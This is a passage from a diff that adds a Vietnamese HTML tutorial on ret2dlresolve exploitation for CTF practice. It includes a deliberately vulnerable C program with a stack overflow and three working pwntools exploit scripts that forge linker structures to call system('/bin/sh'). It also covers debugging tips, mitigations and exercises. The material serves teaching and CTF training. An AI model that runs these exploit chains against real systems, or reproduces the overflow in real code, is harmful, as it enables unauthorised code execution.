+    <span class="k">char</span> buf[<span class="d">0x20</span>];              <span class="c">// buffer 32 byte</span>
+    read(<span class="d">0</span>, buf, <span class="d">0x200</span>);         <span class="c">// ← LỖI: đọc 0x200 byte vào buf 0x20 → tràn</span>
+}
+<span class="k">int</span> main() { vuln(); }           <span class="c">// không in gì, không có system</span></code></pre>
+
+  <h3>Thu thập thông tin (ánh xạ sang mục 05 &amp; 06)</h3>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Cần gì</th><th>Lấy bằng</th><th>Dùng để</th></tr></thead>
+    <tbody>
+      <tr><td>Điều kiện khả thi</td><td><code>checksec</code></td><td>Xác nhận No PIE + Partial RELRO + No canary → ✅ dùng được</td></tr>
+      <tr><td>Offset tràn</td><td><code>cyclic</code> + GDB</td><td><code>0x20</code> (buf) + <code>8</code> (saved rbp) = <code>0x28</code> tới return address</td></tr>
+      <tr><td>JMPREL / SYMTAB / STRTAB</td><td><code>readelf -d</code> (pwntools đọc hộ)</td><td>Tính <code>reloc_index</code>, <code>sym_index</code>, <code>st_name</code></td></tr>
+      <tr><td>Vùng .bss</td><td><code>readelf -S</code> / <code>exe.bss()</code></td><td>Nơi đặt khối giả (<code>data_addr</code>)</td></tr>
+      <tr><td><code>.plt[0]</code></td><td><code>objdump -d -j .plt</code> / <code>exe.get_section_by_name('.plt')</code></td><td>Chỗ nhảy vào để kích hoạt resolver</td></tr>
+      <tr><td>Gadget rdi/rsi/rdx</td><td><code>ROPgadget</code> / <code>ROP(exe)</code></td><td>Set tham số cho <code>read</code> và cho <code>system</code></td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Luồng khai thác (2 giai đoạn)</h3>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Nạp khối giả vào .bss</h4><p>ROP gọi <code>read(0, data_addr, len)</code> rồi gửi khối <code>Rela+Sym+"system"+"/bin/sh"</code> vào.</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Kích hoạt resolve</h4><p>Set <code>rdi = địa chỉ "/bin/sh"</code> (trong khối vừa nạp), rồi <code>push reloc_index; jmp .plt[0]</code>. Linker resolve <code>system</code> và gọi ngay với <code>rdi</code> đó.</p></div></div>
+
+  <h3>Ba bản exploit</h3>
+  <p>Cùng một bài, viết ba cách — từ "hiểu từng byte" tới "gọn nhất trong thực chiến":</p>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · thủ công (hiểu cơ chế)</button>
+    <button class="tab" data-t="b">B · pwntools tiện ích</button>
+    <button class="tab" data-t="c">C · pwnld + pwnretry</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — dựng 3 cấu trúc BẰNG TAY để thấy rõ cơ chế.</span>
+<span class="c"># (hạn chế hàm tiện ích: không dùng Ret2dlresolvePayload)</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./dlres"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+<span class="c"># --- 3 con trỏ gốc (pwntools đọc .dynamic hộ, thay cho readelf -d) ---</span>
+jmprel = exe.dynamic_value_by_tag(<span class="s">"DT_JMPREL"</span>)   <span class="c"># đầu .rela.plt</span>
+symtab = exe.dynamic_value_by_tag(<span class="s">"DT_SYMTAB"</span>)   <span class="c"># đầu .dynsym</span>
+strtab = exe.dynamic_value_by_tag(<span class="s">"DT_STRTAB"</span>)   <span class="c"># đầu .dynstr</span>
+
+data   = exe.bss(<span class="d">0x100</span>)        <span class="c"># vùng bss cố định đặt khối giả (No PIE)</span>
+
+<span class="c"># --- Bố trí: [Rela 24B][Sym 24B]["system\0"]["/bin/sh\0"] ---</span>
+<span class="c"># Sym phải cách SYMTAB một bội số của 24 để sym_index là số nguyên:</span>
+rela_addr = data
+sym_addr  = data + <span class="d">0x18</span>
+sym_addr += (-(sym_addr - symtab)) % <span class="d">0x18</span>     <span class="c"># đẩy lên bội số 24 kể từ symtab</span>
+str_addr  = sym_addr + <span class="d">0x18</span>
+binsh     = str_addr + <span class="d">len</span>(<span class="s">b"system\x00"</span>)
+
+sym_index   = (sym_addr  - symtab) // <span class="d">0x18</span>
+reloc_index = (rela_addr - jmprel) // <span class="d">0x18</span>
+st_name     =  str_addr  - strtab
+
+<span class="c"># --- Đóng gói từng trường đúng kích thước ---</span>
+fake_sym  = flat(p32(st_name), p8(<span class="d">0x12</span>), p8(<span class="d">0</span>), p16(<span class="d">0</span>), p64(<span class="d">0</span>), p64(<span class="d">0</span>))  <span class="c"># 24B</span>
+r_info    = (sym_index &lt;&lt; <span class="d">32</span>) | <span class="d">7</span>                 <span class="c"># 7 = R_X86_64_JUMP_SLOT</span>
+fake_rela = flat(p64(exe.got[<span class="s">"read"</span>]), p64(r_info), p64(<span class="d">0</span>))    <span class="c"># 24B</span>
+
+<span class="c"># Ghép khối, chèn padding đẩy Sym đúng tới sym_addr đã tính:</span>
+block  = fake_rela
+block += b<span class="s">"\x00"</span> * (sym_addr - rela_addr - <span class="d">len</span>(block))
+block += fake_sym + b<span class="s">"system\x00"</span> + b<span class="s">"/bin/sh\x00"</span>
+
+<span class="c"># --- Gadget &amp; .plt[0] ---</span>
+rop   = ROP(exe)
+pop_rdi = rop.find_gadget([<span class="s">"pop rdi"</span>,<span class="s">"ret"</span>])[<span class="d">0</span>]
+plt0  = exe.get_section_by_name(<span class="s">".plt"</span>).header.sh_addr   <span class="c"># đầu .plt = plt0</span>
+
+<span class="c"># GIAI ĐOẠN 1: read(0, data, len(block)) để nạp khối giả vào bss</span>
+rop.read(<span class="d">0</span>, data, <span class="d">len</span>(block))
+<span class="c"># GIAI ĐOẠN 2: rdi="/bin/sh" → vào plt0 với reloc_index nằm sẵn ngay sau</span>
+rop.raw(pop_rdi); rop.raw(binsh)
+rop.raw(plt0); rop.raw(reloc_index)   <span class="c"># plt0 push link_map; resolver đọc reloc_index ở đây</span>
+
+p.send(flat(b<span class="s">"A"</span>*<span class="d">0x28</span>, rop.chain()))   <span class="c"># 0x28 = buf 0x20 + saved rbp 8</span>
+p.send(block)                         <span class="c"># read() ở GĐ1 nuốt khối này vào bss</span>
+p.interactive()                       <span class="c"># → ra shell</span></code></pre>
+<div class="note warn"><span class="tag">Thành thật về bản A</span>Bản dựng-tay này dạy đúng <em>cơ chế</em> và chạy tốt trên glibc CTF phổ biến (≈2.23–2.31). Nếu glibc rất mới siết kiểm tra bảng version/<code>sym_index</code> → nó có thể hỏng. Lúc đó dùng bản B (pwntools đã xử lý các ca biên này).</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — pwntools lo hết cạm bẫy (căn 24, bảng version, reloc_index).</span>
+<span class="c"># Ngắn, chắc, nên dùng trong thực chiến.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+<span class="k">from</span> pwnlib.rop.ret2dlresolve <span class="k">import</span> Ret2dlresolvePayload
+context.binary = exe = ELF(<span class="s">"./dlres"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+<span class="c"># Dựng sẵn khối giả + chọn địa chỉ bss, tất cả trong 1 dòng:</span>
+dl = Ret2dlresolvePayload(exe, symbol=<span class="s">"system"</span>, args=[<span class="s">"/bin/sh"</span>])
+<span class="c">#   dl.payload   = Rela+Sym+"system"+"/bin/sh" đã căn chỉnh sẵn</span>
+<span class="c">#   dl.data_addr = địa chỉ bss pwntools chọn để đặt khối đó</span>
+
+rop = ROP(exe)
+rop.read(<span class="d">0</span>, dl.data_addr, <span class="d">len</span>(dl.payload))   <span class="c"># GĐ1: nạp khối vào bss</span>
+rop.ret2dlresolve(dl)                          <span class="c"># GĐ2: set reloc_index + nhảy .plt[0]</span>
+
+p.send(flat(b<span class="s">"A"</span>*<span class="d">0x28</span>, rop.chain()))
+p.send(dl.payload)
+p.interactive()                                <span class="c"># → ra shell</span></code></pre>
+<div class="note tip"><span class="tag">So với bản A</span>Hai dòng <code>Ret2dlresolvePayload</code> + <code>rop.ret2dlresolve</code> thay cho toàn bộ phần tính <code>sym_index</code>/căn 24/đóng gói struct ở bản A. Hiểu bản A rồi thì bản B chỉ là "bấm nút".</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — dùng helper nhà: pwnld (khung mode) + pwnretry (chạy lại khi flaky).</span>
+<span class="c"># chạy:  ./exploit 00  (local)  |  ./exploit 01 (local+GDB)  |  ./exploit 2 (remote)</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *                 <span class="c"># start/sl/s/ia + re-export ELF,ROP,flat,context...</span>
+<span class="k">from</span> pwnlib.rop.ret2dlresolve <span class="k">import</span> Ret2dlresolvePayload
+
+context.binary = exe = ELF(<span class="s">"./dlres"</span>, checksec=<span class="k">False</span>)
+set_remote(<span class="s">"chall.server"</span>, <span class="d">1337</span>)         <span class="c"># cho mode 2 (remote)</span>
+
+dl  = Ret2dlresolvePayload(exe, symbol=<span class="s">"system"</span>, args=[<span class="s">"/bin/sh"</span>])
+rop = ROP(exe)
+rop.read(<span class="d">0</span>, dl.data_addr, <span class="d">len</span>(dl.payload))
+rop.ret2dlresolve(dl)
+payload = flat(b<span class="s">"A"</span>*<span class="d">0x28</span>, rop.chain())
+
+p = start()        <span class="c"># mở local/ssh/remote theo mode ở dòng lệnh</span>
+GDB()              <span class="c"># chỉ attach khi mode bật cờ GDB (vd ./exploit 01)</span>
+sl(payload)        <span class="c"># sl = sendline (tự .encode)</span>
+s(dl.payload)      <span class="c"># s  = send: nạp khối giả vào bss</span>
+ia()               <span class="c"># interactive → ra shell</span>
+
+<span class="c"># ── Biến thể pwnretry: khi bản remote CHẬP CHỜN (ASLR/jitter mạng) ──────────</span>
+<span class="c"># ret2dlresolve No PIE vốn tất định nên thường KHÔNG cần retry; mẫu để bạn biết</span>
+<span class="c"># cách bọc khi gặp bài hên-xui:</span>
+<span class="c">#   from pwnretry import retry, got_shell</span>
+<span class="c">#   def attempt(i):</span>
+<span class="c">#       start(); sl(payload); s(dl.payload)</span>
+<span class="c">#       return got_shell()       # gửi "echo MARK", trúng → True</span>
+<span class="c">#   retry(attempt, tries=50)     # chạy lại tới khi ra shell rồi interactive()</span></code></pre>
+<div class="note"><span class="tag">Khi nào dùng pwnretry</span>Hàm <code>retry</code> hợp với exploit <em>xác suất</em>: ASLR brute, partial overwrite 1/16–1/256, canary brute. ret2dlresolve No PIE là tất định nên chỉ cần khi mạng/điều kiện remote chập chờn.</div>
+  </div>
+
+  <p class="lab-sub" style="margin-top:16px">Cả ba bản đều kết thúc bằng một shell. Offset <code>0x28</code> và lớp bảo vệ đã khớp với <code>checksec</code> ở mục 06.</p>
+ </div>
+</section>
+
+<!-- 08 Tools -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">checksec</div><h4>Soi bảo vệ</h4><p>Xác nhận No PIE + Partial RELRO + No canary — bước đầu tiên luôn làm.</p></div>
+    <div class="card"><div class="term">readelf -d / -r / -S</div><h4>Đọc cấu trúc ELF</h4><p><code>-d</code> lấy JMPREL/SYMTAB/STRTAB; <code>-r</code> xem relocation; <code>-S</code> lấy địa chỉ .bss.</p></div>
+    <div class="card"><div class="term">objdump -d -j .plt</div><h4>Xem PLT stub</h4><p>Thấy <code>push $0xN</code> = reloc_index thật, và địa chỉ <code>.plt[0]</code>.</p></div>
+    <div class="card"><div class="term">pwntools ROP / ELF</div><h4>Dựng chain</h4><p><code>ROP(exe)</code> tự tìm gadget và sắp xếp <code>read</code>; <code>exe.bss()</code>, <code>exe.got</code>, <code>dynamic_value_by_tag</code>.</p></div>
+    <div class="card"><div class="term">Ret2dlresolvePayload</div><h4>Tự dựng khối giả</h4><p>Lo hết căn 24 / sym_index / bảng version — bản B.</p></div>
+    <div class="card"><div class="term">pwnld / pwnretry</div><h4>Helper nhà</h4><p><code>start()</code> chọn local/ssh/remote theo mode; <code>retry()</code> cho exploit xác suất.</p></div>
+    <div class="card"><div class="term">ROPgadget</div><h4>Tìm gadget</h4><p><code>ROPgadget --binary ./dlres | grep 'pop rdi'</code> khi cần tự soi.</p></div>
+    <div class="card"><div class="term">GDB + pwndbg</div><h4>Debug</h4><p><code>telescope</code>, <code>vmmap</code>, soi GOT, dừng tại <code>.plt[0]</code> xem resolver chạy.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Debug -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / LỖI THƯỜNG GẶP</div>
+  <h2>Khi shell không bung</h2>
+  <div class="grid">
+    <div class="card"><h4>Crash ngay, chưa tới resolver</h4><p>Offset sai hoặc chain lệch. Dừng GDB tại <code>ret</code> cuối, kiểm <code>rsp</code> có trỏ đúng <code>.plt[0]</code> không.</p></div>
+    <div class="card"><h4>Vào resolver rồi SIGSEGV</h4><p>Hay gặp nhất: <code>data_addr</code> bị chương trình ghi đè, hoặc glibc mới chặn <code>sym_index</code> ngoài <code>.dynsym</code>. Đổi vùng bss, hoặc chuyển sang bản B.</p></div>
+    <div class="card"><h4><code>read</code> đọc thiếu byte</h4><p>Chưa set đủ <code>rdx</code> (độ dài) nên khối giả vào bss bị cụt. Bảo đảm chain set cả <code>rdx</code>.</p></div>
+    <div class="card"><h4>sym_index lệch</h4><p><code>D = sym_addr − symtab</code> không chia hết 24 → linker lấy nhầm Sym. Nhớ căn bội số 24 (bản A đã căn).</p></div>
+    <div class="card"><h4>rdi không trỏ "/bin/sh"</h4><p>Phải set <code>rdi</code> <em>trước</em> khi nhảy resolver: resolve xong linker gọi hàm ngay, dùng luôn <code>rdi</code> hiện tại.</p></div>
+    <div class="card"><h4>Thiếu <code>pop rdi</code></h4><p>Binary cạn gadget → mượn <a href="#s10">ret2csu</a> (lưu ý nó set <code>edi</code> 32-bit), hoặc tái dụng hàm nhập qua <code>rbp</code>.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Recognize -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Dấu hiệu</th><th></th><th>Ý nghĩa với ret2dlresolve</th></tr></thead>
+    <tbody>
+      <tr><td>No PIE</td><td class="yes">✅</td><td>Rất hợp — địa chỉ bss/.plt/section cố định, dễ dựng</td></tr>
+      <tr><td>Partial / No RELRO</td><td class="yes">✅</td><td>Lazy binding còn bật → resolver còn chạy</td></tr>
+      <tr><td>Không có đường leak</td><td class="yes">✅</td><td>Đây là lúc dlresolve tỏa sáng (ret2libc cần leak, nó thì không)</td></tr>
+      <tr><td>Có .bss cố định + <code>read</code>/<code>gets</code></td><td class="yes">✅</td><td>Có chỗ đặt cấu trúc giả</td></tr>
+      <tr><td>Full RELRO</td><td class="no">❌</td><td>GOT resolve sẵn + khóa lúc load, lazy binding tắt → không dùng được</td></tr>
+      <tr><td>PIE bật</td><td class="maybe">⚠️</td><td>Phải leak PIE base trước → mất ưu thế "không leak"</td></tr>
+      <tr><td>Static binary</td><td class="no">❌</td><td>Không có dynamic linker → dùng <strong>ret2syscall</strong> thay</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">Vì sao Full RELRO chặn</span>Full RELRO ép linker resolve <strong>toàn bộ</strong> symbol ngay lúc load rồi set GOT read-only. Lúc đó <code>got+16</code> không còn trỏ <code>_dl_runtime_resolve</code> kiểu lazy, PLT stub không đi qua resolver nữa → cơ chế ta lợi dụng biến mất. Gặp Full RELRO → chuyển hướng (leak + ret2libc).</div>
+ </div>
+</section>
+
+<!-- 11 Exercises -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập theo lộ trình</h2>
+  <div class="ex"><div class="level">⭐⭐ · Làm lại y hệt</div><p>Biên dịch <code>dlres.c</code> ở mục 07 với đúng cờ. Chạy bản B tới khi ra shell. Rồi mở GDB, đặt breakpoint ở <code>.plt[0]</code>, chạy bản A và <em>xem</em> resolver đọc khối giả của bạn.</p>
+    <details><summary>Gợi ý</summary><div class="dc">Nếu bản A hỏng mà bản B chạy → gần như chắc là ca glibc mới / căn chỉnh. Xác nhận bằng cách so <code>dl.data_addr</code> (bản B) với <code>data</code> bạn chọn.</div></details></div>
+  <div class="ex"><div class="level">⭐⭐ · Dựng tay theo ir0nstone</div><p>Theo bài <em>ret2dlresolve</em> của ir0nstone, tự tính <code>r_info</code>/alignment bằng tay (không <code>Ret2dlresolvePayload</code>). Mục tiêu: hiểu vì sao phải chia hết 24.</p>
+    <details><summary>Gợi ý</summary><div class="dc"><code>sym_index = (sym_addr − symtab)//24</code>; nếu không chia hết, linker lấy nhầm Sym. In các địa chỉ ra, đối chiếu <code>readelf -d</code>.</div></details></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · Thiếu cả <code>pop rdi</code> lẫn csu</div><p>Khi binary cạn gadget: tái dụng chính hàm nhập liệu qua <code>rbp</code> để vừa ghi bss vừa set <code>rdi</code>, kèm stack pivot. (Hướng <em>function reuse / rbp</em>.)</p>
+    <details><summary>Gợi ý</summary><div class="dc">Pivot stack về bss nơi bạn đã kiểm soát, rồi dùng <code>leave; ret</code> để đổi <code>rsp</code>. Đây là cầu nối sang bài stack pivot.</div></details></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · Đối chiếu: static binary</div><p>Lấy một binary <code>-static</code>, xác nhận ret2dlresolve <strong>không</strong> dùng được, rồi giải bằng <strong>ret2syscall</strong>. Hiểu rõ ranh giới của kỹ thuật.</p></div>
+ </div>
+</section>
+
+<!-- 12 Glossary -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">dynamic linker / ld.so / rtld</div><p>Chương trình nạp libc và điền địa chỉ hàm lúc chạy.</p></div>
+    <div class="card"><div class="term">resolve symbol</div><p>Tìm địa chỉ thật của một hàm theo tên rồi ghi lại.</p></div>
+    <div class="card"><div class="term">PLT</div><p>Bảng các stub cầu nối; <code>func@plt</code> làm <code>jmp *func@got</code>.</p></div>
+    <div class="card"><div class="term">GOT</div><p>Bảng con trỏ hàm, ghi được; nơi chứa địa chỉ thật sau resolve.</p></div>
+    <div class="card"><div class="term">lazy binding</div><p>Chỉ resolve hàm vào lần gọi đầu, không phải lúc khởi động.</p></div>
+    <div class="card"><div class="term">_dl_runtime_resolve</div><p>Hàm của ld.so thực hiện resolve; ta gọi lại nó thủ công.</p></div>
+    <div class="card"><div class="term">Elf64_Rela</div><p>Mô tả 1 relocation: ô GOT nào, symbol nào (<code>r_info</code>).</p></div>
+    <div class="card"><div class="term">Elf64_Sym</div><p>Mô tả 1 symbol: tên (<code>st_name</code> → .dynstr).</p></div>
+    <div class="card"><div class="term">.dynstr / .dynsym / .rela.plt</div><p>Kho chuỗi tên / bảng symbol / bảng relocation.</p></div>
+    <div class="card"><div class="term">reloc_index</div><p>Chỉ số vào .rela.plt; tham số ta điều khiển đưa resolver.</p></div>
+    <div class="card"><div class="term">RELRO</div><p>Cơ chế khóa GOT; Full RELRO tắt lazy binding → chặn kỹ thuật.</p></div>
+    <div class="card"><div class="term">ret2csu</div><p>Mượn gadget __libc_csu_init để set rdi/rsi/rdx khi thiếu <code>pop</code>.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li><a href="https://ir0nstone.gitbook.io/notes/binexp/stack/ret2dlresolve" target="_blank" rel="noopener">ir0nstone — ret2dlresolve</a> (dựng tay chi tiết, bài tập ⭐⭐).</li>
+    <li><a href="https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html" target="_blank" rel="noopener">pwntools — Ret2dlresolvePayload</a> (tham số của bản B).</li>
+    <li>Phrack #58-4 — bài gốc "The advanced return-into-lib(c) exploits" (lý thuyết nền).</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>ret2dlresolve.</strong> Viên gạch tiếp theo trên nền ROP. Khi gặp Full RELRO ta sẽ cần hướng khác (leak + ret2libc); khi thiếu gadget set tham số, cầu nối là ret2csu và stack pivot.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  // Theme
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("r2d-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("r2d-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  // Resolve-chain stepper
+  var nodes=[].slice.call(document.querySelectorAll("#chain .node"));
+  var arrows=[].slice.call(document.querySelectorAll("#chain .arrow"));
+  var explain=document.getElementById("explain");
+  var scount=document.getElementById("scount");
+  var nextBtn=document.getElementById("next");
+  var resetBtn=document.getElementById("reset");
+  var msgs=[
+    "Ta <b>push reloc_index giả</b> lên stack rồi nhảy vào .plt[0]. Linker tưởng đây là lần gọi hàm đầu tiên và bắt đầu resolve.",
+    "Linker tính <b>Rela = JMPREL + reloc_index×24</b> → rơi vào <b>Rela giả</b> của ta trong .bss. Nó đọc trường <b>r_info</b> để lấy sym_index.",
+    "Từ sym_index, linker tính <b>Sym = SYMTAB + sym_index×24</b> → rơi vào <b>Sym giả</b>. Nó đọc <b>st_name</b> (offset vào .dynstr).",
+    "Linker tính <b>chuỗi = STRTAB + st_name</b> → ra chuỗi <b>\"system\"</b> ta tự đặt. Nó tưởng đây là tên hàm thật cần tìm.",
+    "Linker <b>tra \"system\" trong libc</b> và tìm ra địa chỉ thật — <b>ta không cần biết libc ở đâu</b>, nó tự làm hết.",
+    "Resolve xong, linker <b>nhảy thẳng vào system</b>, dùng <b>rdi</b> hiện tại làm tham số. Ta đã set rdi=\"/bin/sh\" → <b>shell bung ra</b>. 🎉"
+  ];
+  var step=0;
+  function render(){
+    nodes.forEach(function(n,i){n.classList.remove("active","done");if(i<step)n.classList.add("done");if(i===step-1)n.classList.add("active");});
+    arrows.forEach(function(a,i){a.classList.toggle("lit", i<step-1 || (i===step-1));});
+    // light arrows up to current
+    arrows.forEach(function(a,i){a.classList.toggle("lit", i<=step-2);});
+    scount.textContent="Bước "+step+" / 6";
+    if(step===0){explain.innerHTML="Bấm <b>Bước tiếp</b> để bắt đầu. Toàn bộ chuỗi này là cơ chế <em>bình thường</em> của linker — ta chỉ thay 4 \"tờ giấy\" đầu bằng hàng giả của mình.";}
+    else{explain.innerHTML=msgs[step-1];}
+    nextBtn.textContent = step>=6 ? "✓ Hoàn tất" : "Bước tiếp ▸";
+    nextBtn.disabled = step>=6;
+    nextBtn.classList.toggle("primary", step<6);
+  }
+  nextBtn.addEventListener("click",function(){if(step<6){step++;render();}});
+  resetBtn.addEventListener("click",function(){step=0;render();});
+  render();
+
+  // Exploit tabs
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});
+    t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden = (k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
+
+</body></html>
